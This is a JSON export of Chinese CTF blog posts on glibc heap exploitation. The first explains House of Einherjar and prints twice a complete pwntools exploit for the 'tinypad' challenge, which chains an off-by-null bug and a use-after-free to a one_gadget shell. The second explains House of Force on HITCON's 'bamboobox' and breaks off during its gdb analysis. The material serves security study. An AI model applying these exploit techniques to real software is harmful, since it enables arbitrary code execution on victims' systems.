[{"title":"House of Einherjar","url":"/2023/04/10/House%20of%20Einherjar/","content":"House of Einherjar原理释放堆块时，unlink后向合并堆块，强制使得 malloc 返回一个几乎任意地址的 chunk 。\nfree 函数中的后向合并核心操作如下\n    /* consolidate backward */\n    if (!prev_inuse(p)) {\n        prevsize = prev_size(p);\n        size += prevsize;\n        p = chunk_at_offset(p, -((long) prevsize));\n        unlink(av, p, bck, fwd);\n    }\n\n\n后向合并时，新的 chunk 的位置取决于 chunk_at_offset(p, -((long) prevsize))\n\n思路1：两个chunk通过后向unlink直接实现任意地址写假设有两个连续的chunk，我们利用低地址的chunk将高地址 chunk 的 prev_size 写为目标地址与当前地址的差值，free后合并，再malloc，就可以申请到目标地址的chunk，实现任意地址写，但是需要在目的 chunk 附近构造相应的 fake chunk，fake_chunk的size字段，必须和chunk_b的pre_size字段一致，为二者之间的偏移量，从而绕过 unlink 的检测。\n思路2：三个chunk通过后向unlink实现double freechunk_0  0xD0    # 堆块大小需要保证释放后不进入tcache bin和fastbin，即存在tcache需要先填满对应的tcache \nchunk_1  0x18    # 堆块大小以8结尾，保证off by null可以覆盖到下一个堆块的prev_inuse\nchunk_2  0xD0    # 堆块大小的最后一个字节必须为00，也就是上一个堆块覆盖prev_inuse后不会影响该堆块的大小\nchunk_3  0x10    # 堆块大小任意，防止前面的堆块合并到Top chunk中\n\n申请四个chunk，第四个chunk用来将前三个chunk与top chunk隔开（防止free前三个chunk后与top chunk合并），先free(chunk_0)，利用off-by-null修改第2个chunk的mem，将第三个chunk的的prev_size修改为前两个chunk大小之和，然后free(chunk_2)，将chunk_0,chunk_1,chunk_2合并，之后申请chunk_0大小和chunk_1大小的chunk，再free(chunk_1),free(chunk_5)，实际chunk_1和chunk_5是同一个chunk，从而实现double free。\n例题：2016_seccon_tinypad\n运行程序发现有四个功能：增删改退，分别用a,d,e,q进行操作，并且每次进行一次操作，程序会把每个chunk的内容输出出来，根据ida伪代码发现只能最多申请4个chunk\nida伪代码主函数\nint __cdecl main(int argc, const char **argv, const char **envp)\n{\n  __int64 v3; // rax\n  int choice; // eax\n  int v5; // eax\n  __int64 v6; // rax\n  size_t v7; // rax\n  int c; // [rsp+4h] [rbp-1Ch] BYREF\n  int i; // [rsp+8h] [rbp-18h]\n  int index; // [rsp+Ch] [rbp-14h]\n  int v12; // [rsp+10h] [rbp-10h]\n  int v13; // [rsp+14h] [rbp-Ch]\n  unsigned __int64 v14; // [rsp+18h] [rbp-8h]\n\n  v14 = __readfsqword(0x28u);\n  v12 = 0;\n  write_n(&amp;unk_4019F0, 1uLL);\n  write_n(\n    \"  ============================================================================\\n\"\n    \"// _|_|_|_|_|  _|_|_|  _|      _|  _|      _|  _|_|_|      _|_|    _|_|_|     \\\\\\\\\\n\"\n    \"||     _|        _|    _|_|    _|    _|  _|    _|    _|  _|    _|  _|    _|   ||\\n\"\n    \"||     _|        _|    _|  _|  _|      _|      _|_|_|    _|_|_|_|  _|    _|   ||\\n\"\n    \"||     _|        _|    _|    _|_|      _|      _|        _|    _|  _|    _|   ||\\n\"\n    \"\\\\\\\\     _|      _|_|_|  _|      _|      _|      _|        _|    _|  _|_|_|     //\\n\"\n    \"  ============================================================================\\n\",\n    563uLL);\n  write_n(&amp;unk_4019F0, 1uLL);\n  do\n  {\n    for ( i = 0; i &lt;= 3; ++i )\n    {\n      LOBYTE(c) = i + 49;\n      writeln(\"+------------------------------------------------------------------------------+\\n\", 81LL);\n      write_n(\" #   INDEX: \", 12uLL);\n      writeln(&amp;c, 1LL);\n      write_n(\" # CONTENT: \", 12uLL);\n      if ( *&amp;tinypad[16 * i + 264] )\n      {\n        v3 = strlen(*&amp;tinypad[16 * i + 264]);\n        writeln(*&amp;tinypad[16 * i + 264], v3);\n      }\n      writeln(&amp;unk_4019F0, 1LL);\n    }\n    index = 0;\n    choice = getcmd();\n    v12 = choice;\n    if ( choice == 68 )\n    {\n      write_n(\"(INDEX)&gt;&gt;&gt; \", 11uLL);\n      index = read_int();\n      if ( index &lt;= 0 || index &gt; 4 )            // 只能申请四个chunk\n                                                // \n      {\nLABEL_29:\n        writeln(\"Invalid index\", 13LL);\n        continue;\n      }\n      if ( !*&amp;tinypad[16 * index + 240] )\n      {\nLABEL_31:\n        writeln(\"Not used\", 8LL);\n        continue;\n      }\n      free(*&amp;tinypad[16 * index + 248]);\n      *&amp;tinypad[16 * index + 240] = 0LL;        // size置为0，头指针未置为0\n      writeln(\"\\nDeleted.\", 9LL);      \t\t\t\t\t//uaf\n    }\n    else if ( choice &gt; 0x44 )\n    {\n      if ( choice != 0x45 )\n      {\n        if ( choice == 81 )\n          continue;\nLABEL_41:\n        writeln(\"No such a command\", 17LL);\n        continue;\n      }\n      write_n(\"(INDEX)&gt;&gt;&gt; \", 11uLL);\n      index = read_int();\n      if ( index &lt;= 0 || index &gt; 4 )\n        goto LABEL_29;\n      if ( !*&amp;tinypad[16 * index + 240] )\n        goto LABEL_31;\n      c = 48;\n      strcpy(tinypad, *&amp;tinypad[16 * index + 248]);\n      while ( toupper(c) != 89 )\n      {\n        write_n(\"CONTENT: \", 9uLL);\n        v6 = strlen(tinypad);\n        writeln(tinypad, v6);\n        write_n(\"(CONTENT)&gt;&gt;&gt; \", 13uLL);\n        v7 = strlen(*&amp;tinypad[16 * index + 248]);\n        read_until(tinypad, v7, 10u);\n        writeln(\"Is it OK?\", 9LL);\n        write_n(\"(Y/n)&gt;&gt;&gt; \", 9uLL);\n        read_until(&amp;c, 1uLL, 10u);\n      }\n      strcpy(*&amp;tinypad[16 * index + 248], tinypad);\n      writeln(\"\\nEdited.\", 8LL);\n    }\n    else\n    {\n      if ( choice != 65 )\n        goto LABEL_41;\n      while ( index &lt;= 3 &amp;&amp; *&amp;tinypad[16 * index + 256] )\n        ++index;\n      if ( index == 4 )\n      {\n        writeln(\"No space is left.\", 17LL);\n      }\n      else\n      {\n        v13 = -1;\n        write_n(\"(SIZE)&gt;&gt;&gt; \", 10uLL);\n        v13 = read_int();\n        if ( v13 &lt;= 0 )\n        {\n          v5 = 1;\n        }\n        else\n        {\n          v5 = v13;\n          if ( v13 &gt; 0x100 )\n            v5 = 256;\n        }\n        v13 = v5;\n        *&amp;tinypad[16 * index + 256] = v5;\n        *&amp;tinypad[16 * index + 264] = malloc(v13);\n        if ( !*&amp;tinypad[16 * index + 264] )\n        {\n          writerrln(\"[!] No memory is available.\", 27LL);\n          exit(-1);\n        }\n        write_n(\"(CONTENT)&gt;&gt;&gt; \", 13uLL);\n        read_until(*&amp;tinypad[16 * index + 264], v13, 10u);\n        writeln(\"\\nAdded.\", 7LL);\n      }\n    }\n  }\n  while ( v12 != 81 );\n  return 0;\n}\n\nadd函数\n    *&amp;tinypad[16 * index + 0x100] = v5;\n    *&amp;tinypad[16 * index + 264] = malloc(v13);\n\n存在chunk全局数组，起始地址从0x602040+16*0+0x100=0x602140 开始依次存放chunk的size大小和头指针\nedit函数该edit函数调用的read_until函数存在off-by-null漏洞\nfree函数free函数存在uaf漏洞\n思路首先泄露libc和heap地址\n利用 house of einherjar 方法在 tinypad 的前0x100字节中伪造 chunk。当我们再次申请时，那么就可以控制4个 memo 的指针和内容了。\n这里虽然我们的第一想法可能是直接覆盖 malloc_hook 为 one_gadget 地址，但是，由于当编辑时，程序是利用 strlen 来判读可以读取多少长度，而 malloc_hook 则在初始时为 0。不能覆盖malloc_hook\nv6 = strlen(tinypad);\n\n可以泄露出environ 的地址，通过gdb调试进而求得存储 main 函数的返回地址的地址，将main 函数的返回地址覆盖为one_gadget来获得shell\n利用过程先把前面的代码写好\n# coding=utf-8\nfrom pwn import*\ncontext(endian='little',os='linux',arch='amd64',log_level='debug') #小端序，linux系统，64位架构,debug\nsh = process('./tinypad')\nlibc = ELF('//home/pwn/tools/glibc-all-in-one/libs/2.23-0ubuntu11_amd64/libc-2.23.so')\n\n#命令简写化\ns       = lambda data               :sh.send(data)\nsa      = lambda delim,data         :sh.sendafter(delim, data)\nsl      = lambda data               :sh.sendline(data)\nsla     = lambda delim,data         :sh.sendlineafter(delim, data)\nr       = lambda num=4096           :sh.recv(num)\nru      = lambda delims             :sh.recvuntil(delims)\nitr     = lambda                    :sh.interactive()\nuu32    = lambda data               :u32(data.ljust(4,'\\0'))\nuu64    = lambda data               :u64(data.ljust(8,'\\0'))\nleak    = lambda name,addr          :log.success('{} = {:#x}'.format(name, addr))\nlg      = lambda address,data       :log.success('%s: '%(address)+hex(data))\n#定义gdb调试函数\ndef dbg():\n        gdb.attach(sh)\n        pause()\n\ndef add(size, content='a'):\n    sla('(CMD)&gt;&gt;&gt; ','a')\n    sla('(SIZE)&gt;&gt;&gt; ',str(size))\n    sla('(CONTENT)&gt;&gt;&gt; ',content)\n\n\n\ndef edit(idx, content):\n    sla('(CMD)&gt;&gt;&gt; ','e')\n    sla('(INDEX)&gt;&gt;&gt; ',str(idx))\n    sla('(CONTENT)&gt;&gt;&gt; ',content)\n    sla('Is it OK?\\n','Y')\n   \n\n\ndef free(idx):\n    sla('(CMD)&gt;&gt;&gt; ','d')\n    sla('(INDEX)&gt;&gt;&gt; ',str(idx))\n\ndef exit():\n    sla('(CMD)&gt;&gt;&gt; ','Q')\n\n先申请四个chunk，free(3)和free(1),堆块大于0x7f，所以会进入unsorted bin里，chunk是从1开始计数的，此时chunk_1里存放的就是chunk_3的头指针和main_arena+88的地址，chunk_3的头指针前面有两个大小为(0x100+0x10)的chunk，减去(0x100+0x10)*2就是heap的基地址，之后计算出main_arena+88与libc基地址的距离（这个距离是固定的）0x7f19d3ef7b78−0x7f19d3b33000=0x3C4B78\nadd(0x100)\nadd(0x100)\nadd(0x100)\nadd(0x100)\n\nfree(3)\nfree(1)\nru('INDEX: 1')\nru('CONTENT: ')\nheapbase = u64(ru('\\n')[:-1].ljust(8,b'\\x00')) -(0x100+0x10)*2\nru('INDEX: 3')\nru('CONTENT: ')\nlibcbase = u64(ru('\\n')[:-1].ljust(8,b'\\x00')) - 0x3C4B78\nenviron = libc.sym['environ']+libcbase\nlg('heapbase',heapbase)\nlg('libcbase',libcbase)\n\ndbg()\n\n\n在 tinypad 的前0x100字节中伪造 chunk。当我们再次申请时，那么就可以控制4个 memo 的指针和内容了。\nadd(0x100)\nadd(0x100)\n\n#dbg()\n\n#四个chunk与top chunk合并\nfree(4)\nfree(1)\nfree(2)\nfree(3)\n\n#dbg()\n#empty now \n\nadd(0x100,'a'*0x100)\nedit(1,b'a'*0x30+p64(0)+p64(0x41)+p64(0x602070)*2+b'\\x00'*0x20+p64(0x40))\n\n#dbg()\n\n\nfree(1)\n\n\nadd(0x10) #1\nadd(0xf0) #2\nadd(0x10) #3\nadd(0x100,'a'*0x100) #4\n\n之后free(1)，再申请0x18大小的chunk_1，利用add函数里自定义的read函数的off-by-null，可以将chunk_2的pre_size改为chunk数组附近0x602070处，再次free(2)，这样利用House of einherjar，可以将free的 chunk转移到0x602070（chunk_2的头指针）处，就可以0x602040（chunk_1的头指针）处形成我们提前构造好的chunk\n#edit(1,b'a'*0x30+p64(0)+p64(0x41)+p64(0x602070)*2+b'\\x00'*0x20+p64(0x40))\n\n\nfree(1)\ntarget = heapbase+0x20-0x602070\nadd(0x18,b'a'*0x10+p64(target)) #1\n\ndbg()\n\n再free（2），编辑chunk_4就相当于在0x602040处的chunk开始编辑，将\nfree(2)\n\nedit(4,b'a'*0x30+p64(0)+p64(0x101)+p64(main_arena_88)*2)\n\ndbg()\n\n\n再申请0xf0大小的chunk（实际大小为0x100），此时申请的chunk就在0x602070处，而该chunk的mem区域与chunk全局数组起始地址0x602140相差（0x602140-0x602070+0x10）=0xc0，用字符a填充，之后按照chunk size+头指针依次填充全局数组，将chunk_1改为environ地址，chunk2改为0x602148地址（也就是存放environ地址的地址）\nadd(0xf0,b'a'*0xc0+p64(0x100)+p64(environ)+p64(0x100)+p64(0x602148))\nru('INDEX: 1')\nru('CONTENT: ')\nstack= u64(ru('\\n')[:-1].ljust(8,b'\\x00'))\ntarget =  -0xF0 + stack \nlg('stack',stack)\nlg('target',target)\n#0x7fc7dd85ff38 &lt;environ&gt;:\t0x00007ffc91b85d58\t0x0000000000000000\n#1e:00f0│       0x7ffc91b85c68 —▸ 0x7fc7dd4b9830 (__libc_start_main+240) ◂— mov    edi, eax\n#  0x7ffc91b85c68-0x00007ffc91b85d58=-0xF0\ndbg()\n\n\n泄露出来的chunk_1的内容就是栈地址 stack=0x00007ffc91b85d58，在查看栈区main函数返回地址0x7ffc91b85c68，0x7ffc91b85c68-0x00007ffc91b85d58=-0xF0，所以我们要覆盖的main函数返回地址为target = -0xF0 + stack刚才我们把chunk_2的mem指向了chunk_1的mem指针，编辑chunk_2为target地址，把chunk_1的mem指针改为target地址，这时再次编辑chunk_1为one_gadget地址，就把target地址存放的main函数返回地址改为了exeve(“/bin/sh\\x00”)，再退出程序，获得shell\nedit(2,p64(target))\none_gadget = [0x45216,0x4526a,0xf02a4,0xf1147]\nshell = one_gadget[0] + libcbase\nedit(1,p64(shell))\nexit()\nitr()\n\n\nexp# coding=utf-8\nfrom pwn import*\ncontext(endian='little',os='linux',arch='amd64',log_level='debug') #小端序，linux系统，64位架构,debug\nsh = process('./tinypad')\nlibc = ELF('/home/pwn/tools/glibc-all-in-one/libs/2.23-0ubuntu11_amd64/libc-2.23.so')\n\n#命令简写化\ns       = lambda data               :sh.send(data)\nsa      = lambda delim,data         :sh.sendafter(delim, data)\nsl      = lambda data               :sh.sendline(data)\nsla     = lambda delim,data         :sh.sendlineafter(delim, data)\nr       = lambda num=4096           :sh.recv(num)\nru      = lambda delims             :sh.recvuntil(delims)\nitr     = lambda                    :sh.interactive()\nuu32    = lambda data               :u32(data.ljust(4,'\\0'))\nuu64    = lambda data               :u64(data.ljust(8,'\\0'))\nleak    = lambda name,addr          :log.success('{} = {:#x}'.format(name, addr))\nlg      = lambda address,data       :log.success('%s: '%(address)+hex(data))\n#定义gdb调试函数\ndef dbg():\n        gdb.attach(sh)\n        pause()\n\ndef add(size, content='a'):\n    sla('(CMD)&gt;&gt;&gt; ','a')\n    sla('(SIZE)&gt;&gt;&gt; ',str(size))\n    sla('(CONTENT)&gt;&gt;&gt; ',content)\n\n\n\ndef edit(idx, content):\n    sla('(CMD)&gt;&gt;&gt; ','e')\n    sla('(INDEX)&gt;&gt;&gt; ',str(idx))\n    sla('(CONTENT)&gt;&gt;&gt; ',content)\n    sla('Is it OK?\\n','Y')\n   \n\n\ndef free(idx):\n    sla('(CMD)&gt;&gt;&gt; ','d')\n    sla('(INDEX)&gt;&gt;&gt; ',str(idx))\n\ndef exit():\n    sla('(CMD)&gt;&gt;&gt; ','Q')\n     \nadd(0x100)\nadd(0x100)\nadd(0x100)\nadd(0x100)\n\nfree(3)\nfree(1)\nru('INDEX: 1')\nru('CONTENT: ')\nheapbase = u64(ru('\\n')[:-1].ljust(8,b'\\x00')) -(0x100+0x10)*2\nru('INDEX: 3')\nru('CONTENT: ')\nmain_arena_88 = u64(ru('\\n')[:-1].ljust(8,b'\\x00')) \nlibcbase = main_arena_88-0x3C4B78\nenviron = libc.sym['environ']+libcbase\nlg('heapbase',heapbase)\nlg('libcbase',libcbase)\n\n#dbg()\n\nadd(0x100)\nadd(0x100)\n\n#dbg()\n\n#四个chunk与top chunk合并\nfree(4)\nfree(1)\nfree(2)\nfree(3)\n\n#dbg()\n#empty now \n\nadd(0x100,'a'*0x100)\nedit(1,b'a'*0x30+p64(0)+p64(0x41)+p64(0x602070)*2+b'\\x00'*0x20+p64(0x40))\n\n#dbg()\n\nfree(1)\n\nadd(0x10) #1\nadd(0xf0) #2\nadd(0x10) #3\nadd(0x100,'a'*0x100) #4\n\n#dbg()\n\nfree(1)\n\n#dbg()\n\ntarget = heapbase+0x20-0x602070\nadd(0x18,b'a'*0x10+p64(target)) #1\n\n\nfree(2)\n\n#dbg()\n\nedit(4,b'a'*0x30+p64(0)+p64(0x101)+p64(main_arena_88)*2)\n\n#dbg()\n\nadd(0xf0,b'a'*0xc0+p64(0x100)+p64(environ)+p64(0x100)+p64(0x602148))\nru('INDEX: 1')\nru('CONTENT: ')\nstack= u64(ru('\\n')[:-1].ljust(8,b'\\x00'))\ntarget =  -0xF0 + stack \nlg('stack',stack)\nlg('target',target)\n#0x7f825ab56f38 &lt;environ&gt;:\t0x00007ffe282d8c28\t0x0000000000000000\n#00:0000│  0x7ffe282d8b38 —▸ 0x7f825a7b0830 (__libc_start_main+240) ◂— mov    edi, eax\n#  0x7ffe282d8b38-0x00007ffe282d8c28=-0xF0\n#dbg()\n\nedit(2,p64(target))\none_gadget = [0x45216,0x4526a,0xf02a4,0xf1147]\nshell = one_gadget[0] + libcbase\nedit(1,p64(shell))\nexit()\n \nitr()\n\n","tags":["House of 系列"]},{"title":"House of Force","url":"/2023/09/12/House%20of%20Force/","content":"PWN入门（3-12-1）-House Of Force（控制top_chunk）（基础）参考资料：CTF-wiki：https://ctf-wiki.github.io/ctf-wiki/pwn/linux/glibc-heap/house_of_force-zh/附件下载：链接: https://pan.baidu.com/s/1NiEZbuBUCFJrMOjqlazPUA  密码: np57–来自百度网盘超级会员V3的分享    House Of Force是一种堆的利用方法，其主要原理是控制heap中的top_chunk并malloc来达到控制任意内存的空间。\n题目来源：HITCON training lab 11附件：链接: https://pan.baidu.com/s/1qdOlp9RT_7mxhw_187ugXQ  密码: abtk–来自百度网盘超级会员V3的分享\nLinux环境老规矩，checksec一下文件先\n\n计算一下 main_arena 距离 libc 的距离\n\n程序的源代码(c)#include &lt;fcntl.h&gt;\n#include &lt;stdio.h&gt;\n#include &lt;stdlib.h&gt;\n#include &lt;sys/stat.h&gt;\n#include &lt;sys/types.h&gt;\n#include &lt;unistd.h&gt;\nstruct item {\n  int size;\n  char *name;\n};\n\nstruct item itemlist[100] = {0};\n\nint num;\n\nvoid hello_message() {\n  puts(\"There is a box with magic\");\n  puts(\"what do you want to do in the box\");\n}\n\nvoid goodbye_message() {\n  puts(\"See you next time\");\n  puts(\"Thanks you\");\n}\n\nstruct box {\n  void (*hello_message)();\n  void (*goodbye_message)();\n};\n\nvoid menu() {\n  puts(\"----------------------------\");\n  puts(\"Bamboobox Menu\");\n  puts(\"----------------------------\");\n  puts(\"1.show the items in the box\");\n  puts(\"2.add a new item\");\n  puts(\"3.change the item in the box\");\n  puts(\"4.remove the item in the box\");\n  puts(\"5.exit\");\n  puts(\"----------------------------\");\n  printf(\"Your choice:\");\n}\n\nvoid show_item() {\n  int i;\n  if (!num) {\n    puts(\"No item in the box\");\n  } else {\n    for (i = 0; i &lt; 100; i++) {\n      if (itemlist[i].name) {\n        printf(\"%d : %s\", i, itemlist[i].name);\n      }\n    }\n    puts(\"\");\n  }\n}\n\nint add_item() {\n\n  char sizebuf[8];\n  int length;\n  int i;\n  int size;\n  if (num &lt; 100) {\n    printf(\"Please enter the length of item name:\");\n    read(0, sizebuf, 8);\n    length = atoi(sizebuf);\n    if (length == 0) {\n      puts(\"invaild length\");\n      return 0;\n    }\n    for (i = 0; i &lt; 100; i++) {\n}\n\nvoid change_item() {\n\n  char indexbuf[8];\n  char lengthbuf[8];\n  int length;\n  int index;\n  int readsize;\n\n  if (!num) {\n    puts(\"No item in the box\");\n  } else {\n    printf(\"Please enter the index of item:\");\n    read(0, indexbuf, 8);\n    index = atoi(indexbuf);\n    if (itemlist[index].name) {\n      printf(\"Please enter the length of item name:\");\n      read(0, lengthbuf, 8);\n      length = atoi(lengthbuf);\n      printf(\"Please enter the new name of the item:\");\n      readsize = read(0, itemlist[index].name, length);\n      *(itemlist[index].name + readsize) = '\\x00';\n    } else {\n      puts(\"invaild index\");\n    }\n  }\n}\nvoid remove_item() {\n  char indexbuf[8];\n  int index;\n\n  if (!num) {\n    puts(\"No item in the box\");\n  } else {\n    printf(\"Please enter the index of item:\");\n    read(0, indexbuf, 8);\n    index = atoi(indexbuf);\n    if (itemlist[index].name) {\n      free(itemlist[index].name);\n      itemlist[index].name = 0;\n      itemlist[index].size = 0;\n      puts(\"remove successful!!\");\n      num--;\n    } else {\n      puts(\"invaild index\");\n    }\n  }\n}\n\nvoid magic() {\n  int fd;\n  char buffer[100];\n  fd = open(\"./flag\", O_RDONLY);\n  read(fd, buffer, sizeof(buffer));\n  close(fd);\n  printf(\"%s\", buffer);\n  exit(0);\n}\n\nint main() {\n\n  char choicebuf[8];\n  int choice;\n  struct box *bamboo;\n  setvbuf(stdout, 0, 2, 0);\n  setvbuf(stdin, 0, 2, 0);\n  bamboo = malloc(sizeof(struct box));\n  bamboo-&gt;hello_message = hello_message;\n  bamboo-&gt;goodbye_message = goodbye_message;\n  bamboo-&gt;hello_message();\n\n  while (1) {\n    menu();\n    read(0, choicebuf, 8);\n    choice = atoi(choicebuf);\n    switch (choice) {\n    case 1:\n      show_item();\n      break;\n    case 2:\n      add_item();\n      break;\n    case 3:\n      change_item();\n      break;\n    case 4:\n      remove_item();\n      break;\n    case 5:\n      bamboo-&gt;goodbye_message();\n      exit(0);\n      break;\n    default:\n      puts(\"invaild choice!!!\");\n      break;\n    }\n  }\n\n  return 0;\n}\n\nIDA静态分析main函数int __cdecl main(int argc, const char **argv, const char **envp)\n{\n  void (**v4)(void); // [rsp+8h] [rbp-18h]\n  char buf[8]; // [rsp+10h] [rbp-10h] BYREF\n  unsigned __int64 v6; // [rsp+18h] [rbp-8h]\n\n  v6 = __readfsqword(0x28u);\n  setvbuf(stdout, 0LL, 2, 0LL);\n  setvbuf(stdin, 0LL, 2, 0LL);\n  v4 = (void (**)(void))malloc(0x10uLL);\n  *v4 = (void (*)(void))hello_message;\n  v4[1] = (void (*)(void))goodbye_message;\n  (*v4)();\n  while ( 1 )\n  {\n    menu();\n    read(0, buf, 8uLL);\n    switch ( atoi(buf) )\n    {\n      case 1:\n        show_item();\n        break;\n      case 2:\n        add_item();\n        break;\n      case 3:\n        change_item(buf, buf);\n        break;\n      case 4:\n        remove_item();\n        break;\n      case 5:\n        v4[1]();\n        exit(0);\n      default:\n        puts(\"invaild choice!!!\");\n        break;\n    }\n  }\n}\n\n​\tmain函数其实没有什么好说的，但是值得注意的是程序开头就申请了一片堆空间来存放hello_message和goodbye_message，并在程序开始的时候调用hello_message和在程序结束的时候调用goodbye_message。\nmeau函数void __cdecl menu()\n{\n  puts(\"----------------------------\");\n  puts(\"Bamboobox Menu\");\n  puts(\"----------------------------\");\n  puts(\"1.show the items in the box\");\n  puts(\"2.add a new item\");\n  puts(\"3.change the item in the box\");\n  puts(\"4.remove the item in the box\");\n  puts(\"5.exit\");\n  puts(\"----------------------------\");\n  printf(\"Your choice:\");\n}\n\n这是一个程序的菜单函数，没有什么特别的。\nshow_item\n首先判断存放于bss段的全局变量num是否有数据，然后进入循环打印程序各个结构体的内容，没有什么好看的。\nadd_item\n首先根据num判断是否堆满了，然后根据堆结构体写入数据\nchange_item\nremove_item\n程序free的很干净，不存在uaf\nmagic\n目标地址，控制程序执行流到magic函数的位置即可get flag\n结构体\n对应c代码的 item 结构体\npwndbg 动态调试堆内存分布首先使用gdb动态调试程序，创建两个堆块，然后进入调试模式，详细信息如下面的代码框所示：\n\nchunk0:size=10，content=”aaaaa”\nchunk1:size=20，content=”bbbbb”\n\ngiantbranch@ubuntu:/mnt/hgfs/PWN题/Range/ctfshow/ctf-pwn-challenges/heap/house-of-force/hitcontrani\nng_lab11$ gdb bamboobox\nGNU gdb (Ubuntu 7.11.1-0ubuntu1~16.5) 7.11.1\nCopyright (C) 2016 Free Software Foundation, Inc.\nLicense GPLv3+: GNU GPL version 3 or later &lt;http://gnu.org/licenses/gpl.html&gt;\nThis is free software: you are free to change and redistribute it.\nThere is NO WARRANTY, to the extent permitted by law.  Type \"show copying\"\nand \"show warranty\" for details.\nThis GDB was configured as \"x86_64-linux-gnu\".\nType \"show configuration\" for configuration details.\nFor bug reporting instructions, please see:\n&lt;http://www.gnu.org/software/gdb/bugs/&gt;.\nFind the GDB manual and other documentation resources online at:\n&lt;http://www.gnu.org/software/gdb/documentation/&gt;.\nFor help, type \"help\".\nType \"apropos word\" to search for commands related to \"word\"...\npwndbg: loaded 175 commands. Type pwndbg [filter] for a list.\npwndbg: created $rebase, $ida gdb functions (can be used with print/break)\nReading symbols from bamboobox...(no debugging symbols found)...done.\npwndbg&gt; r\nStarting program: /mnt/hgfs/PWN题/Range/ctfshow/ctf-pwn-challenges/heap/house-of-force/hitcontraning_lab11/bamboobox \nThere is a box with magic\nwhat do you want to do in the box\n----------------------------\nBamboobox Menu\n----------------------------\n1.show the items in the box\n2.add a new item\n3.change the item in the box\n4.remove the item in the box\n5.exit\n----------------------------\nYour choice:2\nPlease enter the length of item name:10\nPlease enter the name of item:aaaaa\n----------------------------\nBamboobox Menu\n----------------------------\n1.show the items in the box\n2.add a new item\n3.change the item in the box\n4.remove the item in the box\n5.exit\n----------------------------\nYour choice:2\nPlease enter the length of item name:20\nPlease enter the name of item:bbbbb\n----------------------------\nBamboobox Menu\n----------------------------\n1.show the items in the box\n2.add a new item\n3.change the item in the box\n4.remove the item in the box\n5.exit\n----------------------------\nYour choice:^C\nProgram received signal SIGINT, Interrupt.\n0x00007ffff7b04360 in __read_nocancel () at ../sysdeps/unix/syscall-template.S:84\n84\t../sysdeps/unix/syscall-template.S: No such file or directory.\nLEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA\n───────────────────────────────────────────[ REGISTERS ]───────────────────────────────────────────\n RAX  0xfffffffffffffe00\n RBX  0x0\n RCX  0x7ffff7b04360 (__read_nocancel+7) ◂— cmp    rax, -0xfff\n RDX  0x8\n RDI  0x0\n RSI  0x7fffffffdc40 —▸ 0x7fffffff0a32 ◂— 0x0\n R8   0x7ffff7fdd700 ◂— 0x7ffff7fdd700\n R9   0xc\n R10  0x0\n R11  0x246\n R12  0x4007a0 (_start) ◂— xor    ebp, ebp\n R13  0x7fffffffdd30 ◂— 0x1\n R14  0x0\n R15  0x0\n RBP  0x7fffffffdc50 —▸ 0x400ee0 (__libc_csu_init) ◂— push   r15\n RSP  0x7fffffffdc28 —▸ 0x400e5d (main+166) ◂— lea    rax, [rbp - 0x10]\n RIP  0x7ffff7b04360 (__read_nocancel+7) ◂— cmp    rax, -0xfff\n────────────────────────────────────────────[ DISASM ]─────────────────────────────────────────────\n ► 0x7ffff7b04360 &lt;__read_nocancel+7&gt;     cmp    rax, -0xfff\n   0x7ffff7b04366 &lt;__read_nocancel+13&gt;    jae    read+73 &lt;0x7ffff7b04399&gt;\n    ↓\n   0x7ffff7b04399 &lt;read+73&gt;               mov    rcx, qword ptr [rip + 0x2ccad8]\n   0x7ffff7b043a0 &lt;read+80&gt;               neg    eax\n   0x7ffff7b043a2 &lt;read+82&gt;               mov    dword ptr fs:[rcx], eax\n   0x7ffff7b043a5 &lt;read+85&gt;               or     rax, 0xffffffffffffffff\n   0x7ffff7b043a9 &lt;read+89&gt;               ret    \n \n   0x7ffff7b043aa                         nop    word ptr [rax + rax]\n   0x7ffff7b043b0 &lt;write&gt;                 cmp    dword ptr [rip + 0x2d2389], 0 &lt;0x7ffff7dd6740&gt;\n   0x7ffff7b043b7 &lt;write+7&gt;               jne    write+25 &lt;0x7ffff7b043c9&gt;\n    ↓\n   0x7ffff7b043c9 &lt;write+25&gt;              sub    rsp, 8\n─────────────────────────────────────────────[ STACK ]─────────────────────────────────────────────\n00:0000│ rsp  0x7fffffffdc28 —▸ 0x400e5d (main+166) ◂— lea    rax, [rbp - 0x10]\n01:0008│      0x7fffffffdc30 ◂— 0x200400ee0\n02:0010│      0x7fffffffdc38 —▸ 0x603010 —▸ 0x400896 (hello_message) ◂— push   rbp\n03:0018│ rsi  0x7fffffffdc40 —▸ 0x7fffffff0a32 ◂— 0x0\n04:0020│      0x7fffffffdc48 ◂— 0x2b1241ff949c6b00\n05:0028│ rbp  0x7fffffffdc50 —▸ 0x400ee0 (__libc_csu_init) ◂— push   r15\n06:0030│      0x7fffffffdc58 —▸ 0x7ffff7a2d840 (__libc_start_main+240) ◂— mov    edi, eax\n07:0038│      0x7fffffffdc60 ◂— 0x0\n───────────────────────────────────────────[ BACKTRACE ]───────────────────────────────────────────\n ► f 0     7ffff7b04360 __read_nocancel+7\n   f 1           400e5d main+166\n   f 2     7ffff7a2d840 __libc_start_main+240\nProgram received signal SIGINT\npwndbg&gt; \n\nok，输入完成，接下来我们查看堆的分布\npwndbg&gt; heap\nAllocated chunk | PREV_INUSE\nAddr: 0x603000\nSize: 0x21\n\nAllocated chunk | PREV_INUSE\nAddr: 0x603020\nSize: 0x21\n\nAllocated chunk | PREV_INUSE\nAddr: 0x603040\nSize: 0x21\n\nTop chunk | PREV_INUSE\nAddr: 0x603060\nSize: 0x20fa1\n\npwndbg&gt; \n\n堆的内存分布\npwndbg&gt; x/30gx 0x603000\n0x603000:\t0x0000000000000000\t0x0000000000000021 #func_start_malloc_chunk\n0x603010:\t0x0000000000400896\t0x00000000004008b1\n                    #hello_message      #goodbye_message\n0x603020:\t0x0000000000000000\t0x0000000000000021 #chunk0\n0x603030:\t0x00000a6161616161\t0x0000000000000000\n0x603040:\t0x0000000000000000\t0x0000000000000021 #chunk1\n0x603050:\t0x00000a6262626262\t0x0000000000000000\n0x603060:\t0x0000000000000000\t0x0000000000020fa1 #top_chunk\n......(省略内容均为空)\n0x6030e0:\t0x0000000000000000\t0x0000000000000000\npwndbg&gt; \n\n全局变量\n\n\nnum记录着堆块的数量。\n\n查看一下堆指针信息\npwndbg&gt; x/10gx 0x6020c0\n0x6020c0 &lt;itemlist&gt;:\t0x000000000000000a\t0x0000000000603030 #chunk0\n                        #struct_size        #struct_content_ptr\n0x6020d0 &lt;itemlist+16&gt;:\t0x0000000000000014\t0x0000000000603050 #chunk1\n                        #struct_size        